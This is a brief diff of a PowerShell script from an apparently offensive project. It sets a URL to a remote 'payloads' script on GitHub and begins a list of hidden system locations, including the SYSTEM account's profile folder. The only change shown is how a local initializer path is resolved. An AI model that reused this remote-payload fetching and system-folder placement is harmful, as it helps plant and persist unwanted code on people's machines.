@@ -1,6 +1,5 @@
 $initServiceRootmonmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_rootmonmon.ps1"
-$currLoc = (Get-Location).Path
-$currLoc = "$currLoc\initializer.ps1"
+$currLoc = "$PSScriptRoot\initializer.ps1"
 
 $paths = @(
     "$env:windir\system32\config\systemprofile\AppData\Local",
